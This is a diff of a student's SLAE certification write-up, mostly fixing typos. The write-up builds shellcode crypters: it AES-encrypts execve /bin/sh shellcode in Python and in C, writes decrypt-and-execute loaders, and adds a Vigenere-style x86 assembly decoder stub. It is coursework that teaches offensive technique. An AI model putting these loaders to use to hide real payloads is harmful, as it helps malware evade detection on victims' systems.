@@ -1,8 +1,8 @@
-# Note
+# Note
 
 This MD file has been created for the SecurityTube Linux Assembly Expert certification (https://www.pentesteracademy.com/course?id=3). Student ID: 1483.
 
-# Get execve shellcode
+# Get execve shellcode
 
 Just to get sure, lets compile the execve-stack shellcode and extract it:
 
@@ -19,13 +19,13 @@ cervoise@slae:~$ bash get-shellcode.sh execve-stack
 "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
 ```
 
-# Using AES in Python
+# Using AES in Python
 
-All Python scripts I did in this course were in Python 3 (especially because of the end of life of Python 2). As this is the final exercice and Python 2 is living its last days, lets do this in Python 2.
+All Python scripts I did in this course were in Python 3 (especially because of the end of life of Python 2). As this is the final exercise and Python 2 is living its last days, let's do this in Python 2.
 
-First, we need to be able to load a shellcode in Python 2. A blogpost from 2015 gives this script using *ctype*: http://hacktracking.blogspot.com/2015/05/execute-shellcode-in-python.html.
+First, we need to be able to load a shellcode in Python 2. A blog post from 2015 gives this script using *ctype*: http://hacktracking.blogspot.com/2015/05/execute-shellcode-in-python.html.
 
-I deciced to choose AES. The Simple-AES-Cipher (https://pypi.org/project/Simple-AES-Cipher) is a small Python library based on Python Crypto. Using the example code a crypter can be easily written. Shellcode must be a multiple of 16 bytes, NOP (0x90) are added as padding.
+I decided to choose AES. The Simple-AES-Cipher (https://pypi.org/project/Simple-AES-Cipher) is a small Python library based on Python Crypto. Using the example code a crypter can be easily written. Shellcode must be a multiple of 16 bytes, NOP (0x90) are added as padding.
 
 ```python
 import base64
@@ -99,7 +99,7 @@ $ python encrypter.py '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\
 \x40\x99\x24\x40\x0b\x22\xa0\x33\xdb\x89\x31\xbd\xd9\x1b\x9f\xfb\x90\xe4\xd0\xb2\x9d\xf8\xc1\x7b\x17\x99\x34\xe4\x03\x4a\x5b\x2d\x71\x9e\x6a\x60\x68\x03\xcb\xd7\x07\x80\x7d\x38\xc9\x57\xce\x62
 ```
 
-And a decrypter with shellcode execution. Note, arguments are not passed throught command line in order to reduce the amont of code for the final binary.
+And a decrypter with shellcode execution. Note, arguments are not passed through command line in order to reduce the amount of code for the final binary.
 
 ```python
 from base64 import b64encode
@@ -144,15 +144,15 @@ uid=1000(cervoise) gid=1000(cervoise) groups=1000(cervoise),4(adm),24(cdrom),27(
 $ exit
 ```
 
-This a pretty big program. Even if this could be reduced by removing unused code from libraries or by optimizing import, as Python came with an interpreter, the final ELF will still stay very big (as a shellcode).
+This a pretty big program. Even if this could be reduced by removing unused code from libraries or by optimising import, as Python came with an interpreter, the final ELF will still stay very big (as a shellcode).
 
-# Using AES in C
+# Using AES in C
 
 ## tiny-AES-c
 
-A smaller way is to used a compiled langage as C. The following code is based on a AES library found on GitHub: https://github.com/kokke/tiny-AES-c.
+A smaller way is to use a compiled language as C. The following code is based on a AES library found on GitHub: https://github.com/kokke/tiny-AES-c.
 
-Important point to notice is that *No padding is provided so for CBC and ECB all buffers should be multiples of 16 bytes.*
+Important point to notice is that *No padding is provided so for CBC and ECB all buffers should be multiple of 16 bytes.*
 
 The code is based on the *test.c* file from *github*.
 
@@ -184,7 +184,7 @@ The full encrypter code is :
 static void phex(uint8_t* str);
 
 int main(void)
-{	
+{ 
     uint8_t i;
 
     uint8_t key[16] =        { (uint8_t) 0x73, (uint8_t) 0x65, (uint8_t) 0x63, (uint8_t) 0x75, (uint8_t) 0x72, (uint8_t) 0x69, (uint8_t) 0x74, (uint8_t) 0x79, (uint8_t) 0x74, (uint8_t) 0x75, (uint8_t) 0x62, (uint8_t) 0x65, (uint8_t) 0x53, (uint8_t) 0x4c, (uint8_t) 0x41, (uint8_t) 0x45 };
@@ -274,7 +274,7 @@ $ exit
 
 ## Conclusion
 
-This code is smaller. It is even possible to remove null bytes using the Cesar encoder script from the encoder exercice. However, as this is a full ELF and not a shellcode, the execution flow does not start at the begining of the code:
+This code is smaller. It is even possible to remove null bytes using the Cesar encoder script from the encoder exercise. However, as this is a full ELF and not a shellcode, the execution flow does not start at the beginning of the code:
 
 ```
 cervoise@slae:~/aes/C/tiny-AES-c$ readelf -h decrypt-and-run |grep "Entry"
@@ -287,18 +287,18 @@ decrypt-and-run:     file format elf32-i386
 Disassembly of section .init:
 
 0804831c <_init>:
- 804831c:	53                   	push   ebx
- 804831d:	83 ec 08             	sub    esp,0x8
- 8048320:	e8 00 00 00 00       	call   8048325 <_init+0x9>
+ 804831c: 53                    push   ebx
+ 804831d: 83 ec 08              sub    esp,0x8
+ 8048320: e8 00 00 00 00        call   8048325 <_init+0x9>
 ```
 
-# Old encryption
+# Old encryption
 
 An easiest way to do encryption is using old cryptography like Vigenere like algorythm.
 
-## Crypter
+## Crypter
 
-First step is to code a crypter. For convinience, only a multiple of 4 will be used for key size.
+First step is to code a crypter. For convenience, only a multiple of 4 will be used for key size.
 
 ```python
 #!/usr/bin/python3
@@ -349,50 +349,50 @@ Len: 25
 
 ## Trivial decrypter
 
-Using the xor decoder example from the course, a decrypter can easily be done by using each characters from the key one by one. This method has the incovenience to increase the decoder stub.
+Using the xor decoder example from the course, a decrypter can easily be done by using each character from the key one by one. This method has the inconvenience to increase the decoder stub.
 
-The important think to keep in mind, is to compile a ELF where the .text section is writable in order to test the shellcode.
+The important thing to keep in mind is to compile a ELF where the .text section is writable in order to test the shellcode.
 
 ```ASM
 global _start
 
 section .text
 _start:
-	jmp short call_decrypter
+ jmp short call_decrypter
 
 decrypter:
-	pop esi
-	xor ecx, ecx
-	mov cl, 5 ; 35/8 = 4.375
+ pop esi
+ xor ecx, ecx
+ mov cl, 5 ; 35/8 = 4.375
 
 decrypte:
-	add byte [esi], 0x53
-	inc esi
-	add byte [esi], 0x45
-	inc esi
-	add byte [esi], 0x43
-	inc esi
-	add byte [esi], 0x55
-	inc esi
-	add byte [esi], 0x52
-	inc esi
-	add byte [esi], 0x49
-	inc esi
-	add byte [esi], 0x54
-	inc esi
-	add byte [esi], 0x59
-	inc esi
-	loop decrypte
+ add byte [esi], 0x53
+ inc esi
+ add byte [esi], 0x45
+ inc esi
+ add byte [esi], 0x43
+ inc esi
+ add byte [esi], 0x55
+ inc esi
+ add byte [esi], 0x52
+ inc esi
+ add byte [esi], 0x49
+ inc esi
+ add byte [esi], 0x54
+ inc esi
+ add byte [esi], 0x59
+ inc esi
+ loop decrypte
 
-	jmp short Shellcode
+ jmp short Shellcode
 
 
 call_decrypter:
-	call decrypter
-	Shellcode: db 0xde,0x7b,0x0d,0x13,0xdd,0xe6,0x1f,0x0f,0x15,0xea,0x1f,0x14,0x1c,0x40,0x8f,0xf7,0x36,0x9d,0x10,0x34,0x8f,0x67,0xb7,0x74,0x2d
+ call decrypter
+ Shellcode: db 0xde,0x7b,0x0d,0x13,0xdd,0xe6,0x1f,0x0f,0x15,0xea,0x1f,0x14,0x1c,0x40,0x8f,0xf7,0x36,0x9d,0x10,0x34,0x8f,0x67,0xb7,0x74,0x2d
 ```
 
-Lets test this shellcode
+Let's test this shellcode
 
 ```
 cervoise@slae:~$ nasm -f elf32 vigenere-decrypter-nonull.nasm
@@ -418,40 +418,40 @@ global _start
 section .text
 _start:
 
-	xor eax, eax
-	push eax
-	push 0x59544952
-	push 0x55434553
-	mov eax, esp ;save KEY
-	
-	jmp short call_decrypter
+ xor eax, eax
+ push eax
+ push 0x59544952
+ push 0x55434553
+ mov eax, esp ;save KEY
+ 
+ jmp short call_decrypter
 
 decrypter:
-	pop esi
-	xor ecx, ecx
-	mov cl, 25
+ pop esi
+ xor ecx, ecx
+ mov cl, 25
 
 restore_key:
-	mov ebx, eax ;register used for decryption
+ mov ebx, eax ;register used for decryption
 
 decrypte:
-	mov dl, byte [ebx]
-	add byte [esi], dl
-	inc esi
-	inc ebx
+ mov dl, byte [ebx]
+ add byte [esi], dl
+ inc esi
+ inc ebx
         mov edx, ebx
-	sub edx, eax
-	sub dl, 8
-	jz restore_key
+ sub edx, eax
+ sub dl, 8
+ jz restore_key
 
-	loop decrypte
+ loop decrypte
 
-	jmp short Shellcode
+ jmp short Shellcode
 
 
 call_decrypter:
-	call decrypter
-	Shellcode: db 0xde,0x7b,0x0d,0x13,0xdd,0xe6,0x1f,0x0f,0x15,0xea,0x1f,0x14,0x1c,0x40,0x8f,0xf7,0x36,0x9d,0x10,0x34,0x8f,0x67,0xb7,0x74,0x2d
+ call decrypter
+ Shellcode: db 0xde,0x7b,0x0d,0x13,0xdd,0xe6,0x1f,0x0f,0x15,0xea,0x1f,0x14,0x1c,0x40,0x8f,0xf7,0x36,0x9d,0x10,0x34,0x8f,0x67,0xb7,0x74,0x2d
 ```
  However, theses ASM lines all contains null bytes:
  
@@ -462,8 +462,8 @@ call_decrypter:
 00 56 01                add    BYTE PTR [esi+0x1],dl
  ```
 
-Antoher way could  be investigate but this could increase the size of the shellcode regarding the trivial version.
+Another way could  be investigated but this could increase the size of the shellcode regarding the trivial version.
 
-# Alternatives
+# Alternatives
 
 RC4 or XTEA  are easy algorithms to code in assembly, some examples can be found https://github.com/aelfimow/rc4-asm or https://tinycrypt.wordpress.com/2018/01/24/xtea-block-cipher/.
